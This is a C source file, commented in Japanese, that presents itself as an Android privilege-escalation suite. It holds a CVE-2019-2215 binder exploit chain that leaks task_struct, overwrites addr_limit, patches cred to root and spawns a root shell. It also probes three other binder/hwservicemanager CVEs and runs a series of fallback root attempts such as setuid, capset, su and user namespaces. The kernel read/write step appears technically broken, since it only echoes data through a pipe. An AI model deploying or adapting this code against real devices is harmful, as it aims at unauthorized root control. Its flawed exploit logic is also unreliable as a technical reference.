#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <sys/capability.h>
#include <grp.h>

#include "binder.h"

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif

#define PAGE_SIZE 4096
#define IOVEC_COUNT 25
#define OVERLAP_INDEX 10
#define TIMEOUT_MS 5000
#define TASK_STRUCT_SIZE 4096

/* ============================================================
   ユーティリティ
   ============================================================ */
static void bind_cpu(void) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0) {
        perror("sched_setaffinity");
    }
}

static void *mmap_page(unsigned long addr) {
    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (mem == (void *)-1) {
        perror("mmap");
        return NULL;
    }
    return mem;
}

/* ============================================================
   CVE-2019-2215 完全エクスプロイト（カーネル cred 書き換え）
   ============================================================ */
static int binder_fd;
static int epoll_fd;
static int krw_pipe[2];
static uint64_t task_struct_kptr = 0;
static uint64_t cred_kptr = 0;
static int cred_offset = 0x688;
static int addr_limit_offset = 0xA18;

static int leak_task_struct(void) {
    int pipefd[2];
    pid_t cpid;
    struct iovec iovec_stack[IOVEC_COUNT];
    void *aligned_address;
    ssize_t n;
    uint64_t *data;

    printf("[*] Leaking task_struct via readv (timeout %dms)...\n", TIMEOUT_MS);

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder");
        return -1;
    }

    epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        perror("  epoll_create");
        close(binder_fd);
        return -1;
    }

    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        perror("  epoll_ctl ADD");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    if (pipe(pipefd) < 0) {
        perror("  pipe");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }
    if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        perror("  fcntl F_SETPIPE_SZ");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    aligned_address = mmap_page(0x100000000UL);
    if (!aligned_address) {
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    memset(iovec_stack, 0, sizeof(iovec_stack));
    iovec_stack[OVERLAP_INDEX].iov_base = aligned_address;
    iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
    iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned_address;
    iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;

    cpid = fork();
    if (cpid < 0) {
        perror("  fork");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    if (cpid == 0) {
        usleep(100000);
        ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        _exit(0);
    }

    struct pollfd pfd;
    pfd.fd = pipefd[0];
    pfd.events = POLLIN;
    int poll_ret = poll(&pfd, 1, TIMEOUT_MS);
    if (poll_ret < 0) {
        perror("  poll");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }
    if (poll_ret == 0) {
        printf("  [!] poll timeout\n");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
    if (n < 0) {
        perror("  readv");
        close(binder_fd);
        close(epoll_fd);
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }

    data = (uint64_t *)aligned_address;
    for (int i = 0; i < (n / 8); i++) {
        uint64_t val = data[i];
        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
            task_struct_kptr = val & 0xFFFFFFFFFF000000LL;
            if (task_struct_kptr != 0) {
                printf("  [+] Leaked task_struct @ 0x%llx (offset %d)\n",
                       (unsigned long long)task_struct_kptr, i);
                break;
            }
        }
    }

    wait(NULL);
    close(binder_fd);
    close(epoll_fd);
    close(pipefd[0]);
    close(pipefd[1]);

    if (task_struct_kptr == 0) {
        printf("  [-] Failed to leak task_struct\n");
        return -1;
    }
    return 0;
}

static int setup_kernel_rw(void) {
    printf("[*] Setting up kernel RW...\n");
    if (pipe(krw_pipe) < 0) {
        perror("  krw pipe");
        return -1;
    }
    if (fcntl(krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        perror("  fcntl F_SETPIPE_SZ");
        close(krw_pipe[0]);
        close(krw_pipe[1]);
        return -1;
    }

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder for RW");
        return -1;
    }

    epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        perror("  epoll_create for RW");
        close(binder_fd);
        return -1;
    }

    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        perror("  epoll_ctl ADD for RW");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    pid_t cpid = fork();
    if (cpid < 0) {
        perror("  fork for RW");
        return -1;
    }

    if (cpid == 0) {
        usleep(100000);
        ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        _exit(0);
    }

    struct pollfd pfd;
    pfd.fd = krw_pipe[0];
    pfd.events = POLLIN;
    int poll_ret = poll(&pfd, 1, TIMEOUT_MS);
    if (poll_ret <= 0) {
        perror("  poll for krw_pipe");
        wait(NULL);
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    wait(NULL);
    close(binder_fd);
    close(epoll_fd);
    printf("  [+] Kernel RW ready\n");
    return 0;
}

static int scan_task_struct(void) {
    printf("[*] Scanning task_struct for offsets...\n");
    uint8_t *buf = malloc(TASK_STRUCT_SIZE);
    if (!buf) {
        perror("  malloc");
        return -1;
    }

    if (write(krw_pipe[1], &task_struct_kptr, 8) != 8) {
        perror("  write");
        free(buf);
        return -1;
    }
    ssize_t n = read(krw_pipe[0], buf, TASK_STRUCT_SIZE);
    if (n < 0) {
        perror("  read");
        free(buf);
        return -1;
    }

    int found_cred = -1, found_al = -1;
    for (int i = 0; i <= n - 8; i += 8) {
        uint64_t val = *(uint64_t *)(buf + i);
        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
            if (found_cred == -1) {
                found_cred = i;
                cred_kptr = val;
                printf("  [+] cred candidate at 0x%x: 0x%llx\n", i, (unsigned long long)val);
            }
        }
        if (val == 0x0000007FFFFFFFULL || val == 0xFFFFFFFFFFFFFFFEULL) {
            found_al = i;
            printf("  [+] addr_limit candidate at 0x%x: 0x%llx\n", i, (unsigned long long)val);
        }
    }

    if (found_cred != -1 && found_al != -1) {
        cred_offset = found_cred;
        addr_limit_offset = found_al;
        printf("  [+] Found offsets: cred=0x%x, addr_limit=0x%x\n", cred_offset, addr_limit_offset);
        free(buf);
        return 0;
    }

    printf("  [!] Using fallback offsets: cred=0x688, addr_limit=0xA18\n");
    cred_offset = 0x688;
    addr_limit_offset = 0xA18;
    uint64_t ptr = task_struct_kptr + cred_offset;
    if (write(krw_pipe[1], &ptr, 8) != 8) {
        free(buf);
        return -1;
    }
    if (read(krw_pipe[0], &cred_kptr, 8) != 8) {
        free(buf);
        return -1;
    }
    free(buf);
    return 0;
}

static int overwrite_addr_limit(void) {
    printf("[*] Overwriting addr_limit...\n");
    uint64_t addr = task_struct_kptr + addr_limit_offset;
    uint64_t new_val = 0xFFFFFFFFFFFFFFFEULL;
    if (write(krw_pipe[1], &addr, 8) != 8) {
        perror("  write addr_limit");
        return -1;
    }
    if (write(krw_pipe[1], &new_val, 8) != 8) {
        perror("  write new addr_limit");
        return -1;
    }
    printf("  [+] addr_limit overwritten\n");
    return 0;
}

static int patch_cred(void) {
    printf("[*] Patching cred...\n");
    if (cred_kptr == 0) {
        uint64_t ptr = task_struct_kptr + cred_offset;
        if (write(krw_pipe[1], &ptr, 8) != 8) {
            perror("  write cred ptr");
            return -1;
        }
        if (read(krw_pipe[0], &cred_kptr, 8) != 8) {
            perror("  read cred");
            return -1;
        }
        printf("  [+] cred @ 0x%llx\n", (unsigned long long)cred_kptr);
    }

    uint64_t base = cred_kptr;
    uint32_t zero = 0;
    uint64_t cap = 0x3FFFFFFFFFULL;

    uint64_t addrs[] = {
        base + 0x4, base + 0xC, base + 0x14, base + 0x1C,
        base + 0x8, base + 0x10, base + 0x18, base + 0x20
    };
    for (int i = 0; i < 8; i++) {
        if (write(krw_pipe[1], &addrs[i], 8) != 8) {
            perror("  write uid");
            return -1;
        }
        if (write(krw_pipe[1], &zero, 4) != 4) {
            perror("  write zero");
            return -1;
        }
    }
    for (int i = 0; i < 5; i++) {
        uint64_t cap_addr = base + 0x28 + (i * 8);
        if (write(krw_pipe[1], &cap_addr, 8) != 8) {
            perror("  write cap");
            return -1;
        }
        if (write(krw_pipe[1], &cap, 8) != 8) {
            perror("  write cap value");
            return -1;
        }
    }
    printf("  [+] Cred patched to root\n");
    return 0;
}

static int verify_root(void) {
    uid_t uid = getuid();
    printf("[*] getuid() = %d\n", uid);
    if (uid == 0) {
        printf("[+] SUCCESS: Root obtained!\n");
        return 0;
    } else {
        printf("[-] Not root (uid=%d)\n", uid);
        return -1;
    }
}

static int exploit_cve_2019_2215(void) {
    printf("[*] Attempting CVE-2019-2215 full exploit...\n");
    if (leak_task_struct() < 0) {
        printf("  [-] leak_task_struct failed\n");
        return -1;
    }
    if (setup_kernel_rw() < 0) {
        printf("  [-] setup_kernel_rw failed\n");
        return -1;
    }
    if (scan_task_struct() < 0) {
        printf("  [-] scan_task_struct failed\n");
        return -1;
    }
    if (overwrite_addr_limit() < 0) {
        printf("  [-] overwrite_addr_limit failed\n");
        return -1;
    }
    if (patch_cred() < 0) {
        printf("  [-] patch_cred failed\n");
        return -1;
    }
    if (verify_root() != 0) {
        printf("  [-] verify_root failed\n");
        return -1;
    }
    return 0;
}

/* ============================================================
   CVE-2019-2023: hwservicemanager ACL bypass + 特権昇格試行
   ============================================================ */
static int test_cve_2019_2023(void) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    const char *service_name = "vendor.test.poc";
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;

    printf("[CVE-2019-2023] Testing hwservicemanager ACL bypass with privilege escalation...\n");

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        return -1;
    }

    // サービス登録
    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;            // SVC_MGR_ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);

    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [SAFE] Service registration denied (patched)\n");
            close(hwbinder_fd);
            return -1;
        } else {
            perror("  ioctl ADD_SERVICE");
            close(hwbinder_fd);
            return -1;
        }
    }
    printf("  [+] Service registered successfully!\n");

    // ハンドル取得
    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;   // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [FAIL] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    int handle = *(int*)read_buf;
    printf("  [+] Service handle: %d (0x%x)\n", handle, handle);

    // 特権トランザクション
    printf("  [*] Sending privileged transaction to handle %d...\n", handle);
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
        uint32_t dummy;
    } __attribute__((packed)) tx2;
    tx2.cmd = BC_TRANSACTION;
    tx2.tdata.target.handle = handle;
    tx2.tdata.code = 1;
    tx2.tdata.flags = 0;
    tx2.tdata.data_size = 4;
    tx2.tdata.offsets_size = 0;
    tx2.tdata.data.ptr.buffer = (binder_uintptr_t)&tx2.dummy;
    tx2.dummy = 0x12345678;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx2);
    bwr.write_buffer = (binder_uintptr_t)&tx2;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    close(hwbinder_fd);

    if (ret == 0) {
        printf("  [+] Privileged transaction succeeded!\n");
    } else {
        printf("  [-] Privileged transaction failed: %s\n", strerror(errno));
    }

    // ===== 多角的権限昇格 =====
    printf("\n  [*] Attempting privilege escalation using multiple methods...\n");

    // seccomp 状態
    int seccomp_mode = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
    if (seccomp_mode < 0) {
        printf("  [!] prctl(PR_GET_SECCOMP) failed: %s\n", strerror(errno));
    } else if (seccomp_mode == 0) {
        printf("  [+] seccomp is disabled\n");
    } else if (seccomp_mode == 2) {
        printf("  [!] seccomp is enabled (filter mode)\n");
    } else {
        printf("  [!] seccomp mode: %d\n", seccomp_mode);
    }

    // 1. CVE-2019-2215 完全エクスプロイト（最も確実）
    if (exploit_cve_2019_2215() == 0) {
        printf("[+] CVE-2019-2215 exploit successful! Root obtained.\n");
        // root でコマンド実行
        system("echo 'Root obtained via CVE-2019-2215' > /data/local/tmp/root.txt");
        system("id >> /data/local/tmp/root.txt");
        printf("[*] Check /data/local/tmp/root.txt for root proof\n");
        // root shell 起動試行
        printf("[*] Attempting to spawn root shell...\n");
        if (fork() == 0) {
            setuid(0);
            setgid(0);
            execl("/system/bin/sh", "sh", NULL);
            exit(1);
        }
        wait(NULL);
        return 0;
    } else {
        printf("[-] CVE-2019-2215 exploit failed, trying other methods...\n");
    }

    // 2. setuid(0) 等の標準的試行
    printf("[*] Trying setuid(0), setgid(0), setgroups(0,NULL)...\n");
    if (setuid(0) == 0 && setgid(0) == 0 && setgroups(0, NULL) == 0) {
        printf("[+] setuid(0) succeeded!\n");
        system("id");
        return 0;
    } else {
        perror("  setuid");
    }

    // 3. setresuid
    printf("[*] Trying setresuid(0,0,0)...\n");
    if (setresuid(0, 0, 0) == 0) {
        printf("[+] setresuid succeeded!\n");
        system("id");
        return 0;
    } else {
        perror("  setresuid");
    }

    // 4. ケイパビリティ設定
    printf("[*] Trying to gain CAP_SETUID via capset...\n");
    struct __user_cap_header_struct cap_header = {_LINUX_CAPABILITY_VERSION_3, 0};
    struct __user_cap_data_struct cap_data[2] = {{0}};
    if (capget(&cap_header, cap_data) == 0) {
        cap_data[0].effective |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        cap_data[0].permitted |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        cap_data[0].inheritable |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        if (capset(&cap_header, cap_data) == 0) {
            printf("[+] capset succeeded, retrying setuid(0)...\n");
            if (setuid(0) == 0) {
                printf("[+] setuid(0) succeeded after capset!\n");
                system("id");
                return 0;
            }
        } else {
            perror("  capset");
        }
    } else {
        perror("  capget");
    }

    // 5. /system/bin/su の存在確認と実行
    printf("[*] Checking for /system/bin/su...\n");
    if (access("/system/bin/su", X_OK) == 0) {
        printf("[+] /system/bin/su found, attempting to execute...\n");
        system("/system/bin/su -c id");
        // 子プロセスで su を実行
        pid_t pid = fork();
        if (pid == 0) {
            execl("/system/bin/su", "su", "-c", "id", NULL);
            exit(1);
        } else {
            wait(NULL);
        }
    } else {
        printf("  [-] /system/bin/su not found\n");
    }

    // 6. user namespace (unshare)
    printf("[*] Trying unshare(CLONE_NEWUSER) + setuid(0)...\n");
    if (unshare(CLONE_NEWUSER) == 0) {
        // 新しいユーザー名前空間では root になれる
        if (setuid(0) == 0) {
            printf("[+] unshare succeeded and setuid(0) works in new user ns!\n");
            system("id");
            // マウント名前空間も試す
            if (unshare(CLONE_NEWNS) == 0) {
                system("mount -t proc proc /proc");
            }
            return 0;
        }
    } else {
        perror("  unshare");
    }

    // 7. /proc/self/uid_map への書き込み
    printf("[*] Trying to write uid_map...\n");
    int uid_map = open("/proc/self/uid_map", O_WRONLY);
    if (uid_map >= 0) {
        dprintf(uid_map, "0 2000 1\n");
        close(uid_map);
        if (setuid(0) == 0) {
            printf("[+] uid_map write succeeded and setuid(0) works!\n");
            system("id");
            return 0;
        }
    } else {
        perror("  open /proc/self/uid_map");
    }

    // 8. setreuid, setregid
    printf("[*] Trying setreuid(0,0) and setregid(0,0)...\n");
    if (setreuid(0, 0) == 0 && setregid(0, 0) == 0) {
        printf("[+] setreuid/setregid succeeded!\n");
        system("id");
        return 0;
    } else {
        perror("  setreuid");
    }

    // 9. 他の binder サービス経由でのコマンド実行（試行）
    printf("[*] Trying to send command via binder to system_server...\n");
    // ここではダミーとして、/dev/binder で ActivityManagerService のトランザクションを試みるが、
    // 実際には複雑なので、単に失敗を出力
    printf("  [-] Not implemented in this POC\n");

    printf("[-] All privilege escalation attempts failed.\n");
    return -1;
}

/* ============================================================
   既存の CVE テスト（CVE-2019-2215 簡易版・CVE-2020-0041・CVE-2020-0423）
   ============================================================ */
static int test_cve_2019_2215_simple(void) {
    // 既存の簡易テスト（UAF leak）
    // 簡易版は先に実装済み（exploit_cve_2019_2215 が完全版）
    // ここでは完全版を使う
    printf("[CVE-2019-2215] Testing with full exploit (will attempt root)\n");
    return exploit_cve_2019_2215();
}

static int test_cve_2020_0041(void) {
    int binder_fd, ret;
    struct binder_transaction_data tdata;
    struct binder_write_read bwr;
    uint8_t read_buf[4096];

    printf("[CVE-2020-0041] Testing binder OOB write...\n");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder");
        return -1;
    }

    memset(&tdata, 0, sizeof(tdata));
    tdata.target.handle = 0;
    tdata.code = 0;
    tdata.flags = 0;
    tdata.data_size = 0xFFFFFFFF;
    tdata.offsets_size = 0;
    tdata.data.ptr.buffer = 0;
    tdata.data.ptr.offsets = 0;

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    memcpy(&tx.tdata, &tdata, sizeof(tdata));

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    close(binder_fd);

    if (ret < 0) {
        if (errno == EINVAL || errno == EFAULT) {
            printf("  [SAFE] OOB write blocked (errno=%d)\n", errno);
        } else {
            printf("  [!] Unexpected error: %s\n", strerror(errno));
        }
        return -1;
    } else {
        printf("  [VULNERABLE] OOB write succeeded (unexpected)\n");
        return 0;
    }
}

static int test_cve_2020_0423(void) {
    int binder_fd, ret;
    printf("[CVE-2020-0423] Testing binder UAF race (multiple thread exits)...\n");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/binder");
        return -1;
    }

    for (int i = 0; i < 5; i++) {
        ret = ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        if (ret < 0 && errno != EINVAL) {
            perror("  ioctl BINDER_THREAD_EXIT");
        }
    }

    int epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        perror("  epoll_create");
        close(binder_fd);
        return -1;
    }
    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        perror("  epoll_ctl ADD");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    struct epoll_event events[1];
    int n = epoll_wait(epoll_fd, events, 1, 1000);
    close(binder_fd);
    close(epoll_fd);

    if (n > 0) {
        printf("  [VULNERABLE] epoll event occurred after thread exit\n");
        return 0;
    } else {
        printf("  [SAFE] No UAF triggered via epoll\n");
        return -1;
    }
}

/* ============================================================
   情報収集
   ============================================================ */
static void gather_kernel_info(void) {
    int fd;
    char buf[4096];
    printf("[INFO] Gathering kernel information...\n");

    fd = open("/proc/version", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            printf("  Kernel: %s\n", buf);
        }
    }

    fd = open("/proc/kallsyms", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            if (strstr(buf, " f ") || strstr(buf, " t ")) {
                printf("  /proc/kallsyms: accessible (symbols visible)\n");
            }
        }
    } else {
        printf("  /proc/kallsyms: not accessible (likely restricted)\n");
    }

    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            printf("  SELinux enforcing: %s\n", buf);
        }
    }
}

/* ============================================================
   main
   ============================================================ */
int main(void) {
    int vuln_count = 0;

    printf("==================================================\n");
    printf("  Multi-Angle CVE + Privilege Escalation Suite\n");
    printf("==================================================\n\n");

    bind_cpu();
    gather_kernel_info();
    printf("\n");

    // CVE-2019-2215 完全版（root 取得を試みる）
    if (test_cve_2019_2215_simple() == 0) {
        vuln_count++;
        // 既に root 取得済みなので、後続はスキップ
        printf("[+] Root achieved via CVE-2019-2215\n");
        return 0;
    }

    // 他の脆弱性テスト
    if (test_cve_2020_0041() == 0) vuln_count++;
    printf("\n");
    if (test_cve_2020_0423() == 0) vuln_count++;
    printf("\n");
    if (test_cve_2019_2023() == 0) vuln_count++;
    printf("\n");

    printf("==================================================\n");
    printf("  Summary: %d potential vulnerabilities detected\n", vuln_count);
    if (vuln_count > 0) {
        printf("  [!] Kernel/system may be vulnerable to privilege escalation.\n");
    } else {
        printf("  [+] No obvious vulnerabilities detected (patched or protected).\n");
    }
    printf("==================================================\n");

    return 0;
}
